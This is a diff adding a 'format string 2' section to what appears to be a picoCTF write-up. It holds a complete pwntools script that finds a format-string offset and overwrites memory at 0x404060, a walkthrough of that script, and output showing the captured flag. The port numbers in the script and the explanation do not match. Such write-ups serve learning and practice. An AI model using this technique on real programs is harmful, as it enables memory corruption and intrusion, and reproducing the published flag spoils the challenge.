@@ -625,5 +625,71 @@ Connection: keep-alive
 
 otp=123
 ```
+removes the *otp=123* and forward back the request and it will be validated and you will get the flag
 
-removes the otp=123 and forward back the request and it will be validated and you will get the flag
+## format string 2
+
+```python
+from pwn import *
+
+context.log_level = "critical"
+context.binary = ELF('./vuln')
+
+p = remote('rhea.picoctf.net', 57360)
+
+def exec_fmt(payload):
+    p = remote('rhea.picoctf.net', 57360)
+    p.sendline(payload)
+    return p.recvall()
+
+autofmt = FmtStr(exec_fmt)
+offset = autofmt.offset
+
+payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
+
+p.sendline(payload)
+
+flag = p.recvall()
+
+print("Flag: ", flag)
+```
+
+here the explaination of the code 
+
+* context.log_level = "critical": Sets the logging level to "critical" to reduce the verbosity of the output.
+* context.binary = ELF('./vuln'): Loads the binary file vuln as an ELF (Executable and Linkable Format) object, allowing access to its symbols and sections.
+
+- Connecting to Remote Server
+  Establishes a remote connection to the server at rhea.picoctf.net on port 64167.
+
+```python
+def exec_fmt(payload):
+    p = remote('rhea.picoctf.net', 64167)
+    p.sendline(payload)
+    return p.recvall()
+```
+
+this func sends a payload to the remote server and returns the server's response. Each time it's called, it establishes a new remote connection, sends the payload, and receives all data until the connection is closed.
+
+*Automate the format string exploitation**
+```python
+autofmt = FmtStr(exec_fmt)
+offset = autofmt.offset
+```
+autofmt = FmtStr(exec_fmt): Uses pwntools' FmtStr class to create an automatic format string exploit object using the exec_fmt function.
+offset = autofmt.offset: Determines the offset required to control the format string vulnerability.
+
+*Crafting the Payload*
+```python
+payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
+```
+fmtstr_payload(offset, {0x404060: 0x67616c66}): Generates a format string payload to write the value 0x67616c66 (which is the ASCII string "flag" in little-endian format) to the memory address 0x404060.
+
+*Send the Payload*
+p.sendline(payload): Sends the crafted payload to the remote server.
+flag = p.recvall(): Receives all data from the server, which is expected to include the flag.
+
+```bash
+[eyun@eax pico]$ python ex.py
+Flag:  b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\nHere's your input:                                                                                                      uc    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@\nI have NO clue how you did that, you must be a wizard. Here you go...\npicoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}"
+```
